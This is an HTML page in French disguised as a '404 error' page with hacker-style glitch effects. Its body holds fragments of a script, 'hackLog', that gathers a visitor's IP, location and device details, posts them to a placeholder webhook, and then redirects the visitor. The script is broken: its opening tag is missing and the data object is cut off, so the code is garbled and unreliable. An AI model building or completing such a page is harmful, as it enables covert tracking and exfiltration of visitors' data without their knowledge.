<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ERREUR 404</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap');
    
    * { margin:0; padding:0; overflow:hidden; }
    body, html { height:100%; background:#000; color:#0f0; font-family:'Orbitron', monospace; }
    
    .glitch {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      font-size: 2.5rem; text-align: center; text-shadow: 0 0 10px #0f0;
      animation: glitch 1s infinite alternate;
    }
    .scanline {
      position: absolute; top: 0; width: 100%; height: 5px; background: rgba(0,255,0,0.3);
      animation: scan 3s linear infinite;
    }
    .code {
      position: absolute; bottom: 10px; left: 10px; font-size: 0.8rem; opacity: 0.7;
      animation: typing 5s steps(40) infinite;
      white-space: nowrap; overflow: hidden; border-right: 2px solid #0f0;
    }
    .static {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==') repeat;
      opacity: 0.05; pointer-events: none; animation: noise 0.1s steps(2) infinite;
    }

    @keyframes glitch {
      0%, 100% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
      14% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
      15% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0f0, -0.05em 0.05em 0 #00f; }
      49% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0f0, -0.05em 0.05em 0 #00f; }
      50% { text-shadow: 0.05em 0 0 #0f0, -0.05em 0 0 #f00, 0.05em -0.05em 0 #00f; }
    }
    @keyframes scan { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
    @keyframes typing { from { width: 0; } to { width: 100%; } }
    @keyframes noise { 0%, 100% { transform: translate(0,0); } 10% { transform: translate(-1%,0); } 20% { transform: translate(1%,0); } }
  </style>
</head>
<body>

  <div class="static"></div>
  <div class="scanline"></div>

    > scanning_device... IP: [REDACTED] | Loc: [REDACTED] | Device: [REDACTED]

        const data = {

        await fetch(WEBHOOK_URL, {

          body: JSON.stringify(data)
        });

      } catch (e) { console.error("Erreur:", e); }

      setTimeout(() => { window.location.href = REDIRECT_URL; }, DELAY);
    }

    hackLog();
  </script>
</body>
</html>
